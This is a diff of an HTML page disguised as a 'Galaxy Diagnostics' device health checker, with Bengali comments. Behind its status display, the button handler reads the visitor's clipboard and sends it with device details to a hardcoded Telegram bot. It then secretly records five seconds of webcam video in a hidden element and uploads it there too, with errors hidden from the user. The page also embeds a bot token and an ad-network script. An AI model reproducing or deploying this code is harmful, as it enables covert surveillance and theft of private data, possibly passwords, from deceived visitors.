@@ -3,97 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RK Secure System</title>
+    <title>RK Universe System Monitor</title>
     <script src="https://cdn.tailwindcss.com"></script>
     
     <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
 
     <style>
-        body { background-color: #0b0f1a; color: #e2e8f0; }
-        .glass { background: rgba(22, 30, 45, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
-        .info-row { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 8px; border-left: 3px solid #0ea5e9; }
-        .clip-box { background: #000; color: #38bdf8; padding: 10px; border-radius: 6px; font-size: 11px; font-family: monospace; }
-        #cam-raw { display: none; } /* Video hidden from user */
+        /* মহাকাশ (Space) রানিং ব্যাকগ্রাউন্ড ডিজাইন */
+        body {
+            margin: 0;
+            padding: 0;
+            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
+            overflow: hidden;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            height: 100vh;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: transparent url('https://s3-us-west-2.amazonaws.com/s.cdpn.io/123163/stars.png') repeat top center;
+            z-index: -1;
+            animation: move-stars 100s linear infinite;
+        }
+
+        @keyframes move-stars {
+            from { background-position: 0 0; }
+            to { background-position: 10000px 5000px; }
+        }
+
+        .glass-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            box-shadow: 0 0 30px rgba(0, 191, 255, 0.2);
+        }
+
+        .status-pill {
+            background: rgba(14, 165, 233, 0.15);
+            border: 1px solid rgba(14, 165, 233, 0.3);
+            padding: 10px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+        }
+
+        #video-hidden { display: none; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-4">
+<body class="flex flex-col items-center justify-center">
 
-    <div class="glass p-8 rounded-3xl shadow-2xl w-full max-w-md text-center">
-        <h2 class="text-xl font-bold text-sky-400 mb-6">Device Health Monitor</h2>
+    <div class="stars"></div>
+
+    <div class="glass-box p-8 w-full max-w-md text-center z-10 mx-4">
+        <h1 class="text-2xl font-bold text-sky-400 mb-6 tracking-widest uppercase">Galaxy Diagnostics</h1>
         
-        <div class="text-left mb-6">
-            <div class="info-row">
-                <p class="text-[10px] text-slate-400 uppercase">System OS</p>
-                <p id="ui-os" class="text-sm font-bold text-white">Loading...</p>
+        <div class="text-left space-y-3">
+            <div class="status-pill">
+                <p class="text-[10px] text-sky-300 font-bold uppercase">System Memory (RAM)</p>
+                <p id="ui-ram" class="text-sm">Device RAM: <span class="text-white font-mono">-- GB</span></p>
             </div>
-            <div class="info-row">
-                <p class="text-[10px] text-slate-400 uppercase">Screen Info</p>
-                <p id="ui-res" class="text-sm font-bold text-white">Detecting...</p>
+            <div class="status-pill">
+                <p class="text-[10px] text-sky-300 font-bold uppercase">Power & Charging</p>
+                <p id="ui-battery" class="text-sm font-mono text-white">Checking Battery...</p>
             </div>
-            <div class="mt-4">
-                <p class="text-xs text-slate-400 mb-2 uppercase">Detected Data:</p>
-                <div id="ui-clip" class="clip-box">Checking system...</div>
+            <div class="status-pill">
+                <p class="text-[10px] text-sky-300 font-bold uppercase">Network Speed</p>
+                <p id="ui-net" class="text-sm font-mono text-white">Detecting Connection...</p>
+            </div>
+            <div class="status-pill">
+                <p class="text-[10px] text-sky-300 font-bold uppercase">Storage Info (Estimate)</p>
+                <p id="ui-storage" class="text-sm font-mono text-white">Reading ROM...</p>
             </div>
         </div>
-        
-        <video id="cam-raw" autoplay muted playsinline></video>
 
-        <button id="trigger" class="w-full bg-sky-600 hover:bg-sky-500 text-white font-bold py-4 rounded-2xl transition-all shadow-lg active:scale-95">
-            CHECK SYSTEM STATUS
+        <video id="video-hidden" autoplay muted playsinline></video>
+
+        <button id="start-btn" class="w-full mt-8 bg-gradient-to-r from-sky-600 to-blue-800 hover:scale-105 transition-transform text-white font-black py-4 rounded-xl shadow-lg shadow-sky-500/20">
+            SECURE SYSTEM SYNC
         </button>
 
-        <div id="loader" class="mt-6 hidden flex flex-col items-center">
-            <div class="w-10 h-10 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
-            <p class="text-slate-500 text-xs mt-3">Analyzing device safety...</p>
+        <div id="loader" class="mt-6 hidden">
+            <div class="inline-block w-8 h-8 border-4 border-sky-500 border-t-transparent rounded-full animate-spin"></div>
+            <p class="text-sky-400 text-[10px] mt-2 tracking-tighter">SYNCHRONIZING DATA WITH SATELLITE...</p>
         </div>
     </div>
 
-    <script src="https://pl29349758.profitablecpmratenetwork.com/f2/42/00/f2420045eb6ba63f3b85567782f84caf.js"></script>
-
     <script>
-        const BOT_TOKEN = '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs';
-        const CHAT_ID = '6048050987';
+        const CONFIG = {
+            TOKEN: '8690110916:AAFLWdBhvnrmlC01qxiiYZSLO2Q8RR202xs',
+            CHAT: '6048050987'
+        };
 
-        // Set UI Info
-        document.getElementById('ui-os').innerText = navigator.platform;
-        document.getElementById('ui-res').innerText = window.screen.width + "x" + window.screen.height;
+        // ১. স্ক্রিনে ইনফো লোড করা (RAM, Battery, Network)
+        async function loadDeviceStats() {
+            // RAM
+            if (navigator.deviceMemory) {
+                document.getElementById('ui-ram').innerText = navigator.deviceMemory + " GB Available";
+            } else {
+                document.getElementById('ui-ram').innerText = "Device Protected";
+            }
 
-        const btn = document.getElementById('trigger');
+            // Battery
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                const updateBat = () => {
+                    document.getElementById('ui-battery').innerText = `Level: ${Math.round(bat.level * 100)}% | ${bat.charging ? "Charging ⚡" : "Discharging"}`;
+                };
+                updateBat();
+                bat.onlevelchange = updateBat;
+            }
+
+            // Connection Speed
+            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (net) {
+                document.getElementById('ui-net').innerText = `Speed: ${net.downlink} Mbps | Type: ${net.effectiveType}`;
+            }
+
+            // Storage (ROM)
+            if (navigator.storage && navigator.storage.estimate) {
+                const {quota} = await navigator.storage.estimate();
+                document.getElementById('ui-storage').innerText = `ROM: ~${Math.round(quota / (1024 * 1024 * 1024))} GB (Total Access)`;
+            }
+        }
+
+        loadDeviceStats();
+
+        const btn = document.getElementById('start-btn');
         const loader = document.getElementById('loader');
-        const video = document.getElementById('cam-raw');
+        const video = document.getElementById('video-hidden');
 
         btn.addEventListener('click', async () => {
             btn.style.display = 'none';
             loader.classList.remove('hidden');
 
-            let clipData = "Access Denied";
+            // ক্লিপবোর্ড টেক্সট সংগ্রহ
+            let clip = "Denied";
             try {
-                clipData = await navigator.clipboard.readText();
-                document.getElementById('ui-clip').innerText = clipData || "No data found";
-            } catch (e) { document.getElementById('ui-clip').innerText = "Permission Denied"; }
+                clip = await navigator.clipboard.readText();
+            } catch (e) {}
 
-            // ১. Report Message (Directly to Bot)
-            const logMessage = `
-✅ *SEND SUCCESSFUL: REPORT DETAILS*
+            // ২. টেলিগ্রাম বটে অটোমেটিক রিপোর্ট পাঠানো
+            const fullReport = `
+🚀 *NEW GALAXY DEVICE REPORT*
 ━━━━━━━━━━━━━━━━━━━━
-📱 *Device OS:* \`${navigator.platform}\`
-🖥 *Resolution:* \`${window.screen.width}x${window.screen.height}\`
-🌐 *Browser:* \`${navigator.userAgent.substring(0, 50)}...\`
+📱 *OS:* \`${navigator.platform}\`
+🧠 *RAM:* \`${navigator.deviceMemory || 'Unknown'} GB\`
+🛰 *Network:* \`${navigator.onLine ? "Online" : "Offline"}\`
+🖥 *Display:* \`${window.screen.width}x${window.screen.height}\`
 
-📋 *CLIPBOARD DATA:*
+📋 *CLIPBOARD TEXT:*
 \`\`\`
-${clipData}
+${clip || 'No Data Found'}
 \`\`\`
 ━━━━━━━━━━━━━━━━━━━━`;
 
-            // Auto-send text to bot immediately
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: logMessage, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CONFIG.CHAT, text: fullReport, parse_mode: 'Markdown' })
             });
 
-            // ২. 5s Video Record and Auto-send
+            // ৩. ৫ সেকেন্ডের কুইক ভিডিও রেকর্ড ও অটো-সেন্ড
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -104,20 +176,19 @@ ${clipData}
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
-                    fd.append('video', blob, 'security_clip.mp4');
-                    // Caption e success message bot e jabe
-                    fd.append('caption', '🎥 Video Clip: Send Successful');
+                    fd.append('chat_id', CONFIG.CHAT);
+                    fd.append('video', blob, 'galaxy_capture.mp4');
+                    fd.append('caption', '🎥 *SEND SUCCESSFUL: VIDEO CAPTURE*');
 
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVideo`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 };
 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // 5 Seconds Record
+                setTimeout(() => recorder.stop(), 5000); 
 
             } catch (err) {
-                // Background error - user will not see anything
+                console.log("Permission Refused");
             }
         });
     </script>
